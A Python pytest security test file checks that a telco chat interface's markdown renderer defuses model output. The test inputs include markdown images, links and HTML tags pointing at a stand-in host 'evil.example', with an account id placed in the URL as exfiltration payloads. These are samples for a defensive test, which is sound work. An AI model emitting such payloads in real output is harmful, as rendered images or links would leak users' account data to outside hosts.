"""Model text shown in the browser can't fetch URLs or carry clickable links."""

import pytest

from telco_mcp_lab.chat_ui.safe_render import safe_markdown

pytestmark = pytest.mark.security

EVIL = "https://evil.example/c?d=ACC-1001"


@pytest.mark.parametrize(
    "attack",
    [
        f"![]({EVIL})",
        f'![logo]({EVIL} "title")',
        f"text ![a][r]\n\n[r]: {EVIL}",
        f"[click here]({EVIL})",
        f"[click][r]\n\n[r]: {EVIL}",
        f"<{EVIL}>",
        f'<img src="{EVIL}">',
        f"see {EVIL} now",
        f"[![img]({EVIL})]({EVIL})",
    ],
)
def test_no_image_link_or_html_survives(attack):
    out = safe_markdown(attack)
    assert "![" not in out  # no markdown image
    assert "](" not in out  # no inline link/image target
    assert "<img" not in out.lower() and "<a" not in out.lower()  # no HTML tags
    assert "]:" not in out  # no reference definitions
    # Any URL left is inside an inert code span.
    for i, part in enumerate(out.split("`")):
        if i % 2 == 0:
            assert "evil.example" not in part, out


def test_normal_answers_are_untouched():
    text = "Your plan is **Standard 50GB**.\n\n- line SUB-1001-01: +44*******111\n- status: ACTIVE"
    assert safe_markdown(text) == text


def test_link_text_kept_url_shown_inert():
    assert safe_markdown("See [the guide](https://docs.example/x)") == (
        "See the guide (`https://docs.example/x`)"
    )


def test_empty():
    assert safe_markdown(None) == "" and safe_markdown("") == ""


def test_images_are_named_as_removed():
    """Pins the image rule itself (the link rule would also defuse it: two layers)."""
    assert safe_markdown("![logo](https://x.example/l.png)") == "(image removed: logo)"
    assert safe_markdown("![](https://x.example/l.png)") == "(image removed)"
